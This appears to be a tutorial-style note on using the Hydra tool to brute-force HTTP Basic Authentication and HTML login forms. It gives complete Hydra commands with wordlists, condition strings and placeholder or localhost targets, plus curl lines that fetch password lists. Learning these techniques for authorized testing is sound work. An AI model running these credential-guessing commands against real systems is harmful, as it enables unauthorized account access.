[[Hydra]]
# Basic HTTP Authentication
`Basic Auth` is a rudimentary yet common method for securing resources on the web.

Basic Auth is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. The process begins when a user attempts to access a restricted area. The server responds with a `401 Unauthorized` status and a `WWW-Authenticate` header prompting the user's browser to present a login dialog.

Once the user provides their username and password, the browser concatenates them into a single string, separated by a colon. This string is then encoded using Base64 and included in the `Authorization` header of subsequent requests, following the format `Basic <encoded_credentials>`. The server decodes the credentials, verifies them against its database, and grants or denies access accordingly.

For example, the headers for Basic Auth in a HTTP GET request would look like:
```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```
## Exploiting Basic Auth with Hydra
We can use the `http-get` method with wordlists to attempt to find a username/password combination on a server where we don't know what the specific request is, or we can't see/access where it defines the username/password:
```shell
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt IP_ADRRESS http-get / -s PORT
```

We will use the `http-get` hydra service to brute force the basic authentication target.

If we know the username (`basic-auth-user` in this case), we can simplify the Hydra command and focus solely on brute-forcing the password. Here's the command we'll use:
```bash
# First Download the Wordlist if Needed
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

# Use Hydra
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```
- `-l basic-auth-user`: This specifies that the username for the login attempt is 'basic-auth-user'.
- `-P 2023-200_most_used_passwords.txt`: This indicates that Hydra should use the password list contained in the file '2023-200_most_used_passwords.txt' for its brute-force attack.
- `127.0.0.1`: This is the target IP address, in this case, the local machine (localhost).
- `http-get /`: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/').
- `-s 81`: This overrides the default port for the HTTP service and sets it to 81.

Upon execution, Hydra will systematically attempt each password from the `2023-200_most_used_passwords.txt` file against the specified resource.
# Login Forms
## Understanding Login Forms
At their core, login forms are essentially HTML forms embedded within a webpage. These forms typically include input fields (`<input>`) for capturing the username and password, along with a submit button (`<button>` or `<input type="submit">`) to initiate the authentication process.
### http-post-form
Hydra's `http-post-form` service is specifically designed to target login forms. It enables the automation of POST requests, dynamically inserting username and password combinations into the request body.

The general structure of a Hydra command using `http-post-form` looks like this:
```bash
hydra [options] target http-post-form "path:params:condition_string"
```
#### Understanding the Condition String
Hydra primarily relies on failure conditions (`F=...`) to determine when a login attempt has failed, but you can also specify a success condition (`S=...`) to indicate when a login is successful.

The failure condition (`F=...`) is used to check for a specific string in the server's response that signals a failed login attempt:
```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

You can also configure Hydra to look for that success condition using `S=` such as when there is a distinct success condition (such as HTTP status code 302):
```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

Similarly, if a successful login results in content like "Dashboard" appearing on the page, you can configure Hydra to look for that keyword as a success condition:
```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```
#### Constructing the params String for Hydra
After analyzing the login form's structure and behavior by capturing the request, viewing source code, or monitoring network in dev tools, you can build the params string.

If we've discovered:
- The form submits data to the root path (`/`).
- The username field is named `username`.
- The password field is named `password`.
- An error message "Invalid credentials" is displayed upon failed login.

Therefore, our `params` string would be:
```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```
- `"/"`: The path where the form is submitted.
- `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
- `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.

This `params` string is incorporated into the Hydra command as follows. Hydra will systematically substitute `^USER^` and `^PASS^` with values from your wordlists, sending POST requests to the target and analyzing the responses for the specified failure condition:

```bash
# First we download the necessary wordlists
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```
```bash
# Then we can execute the command to bruteforce
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f TARGET_IP -s TARGET_PORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```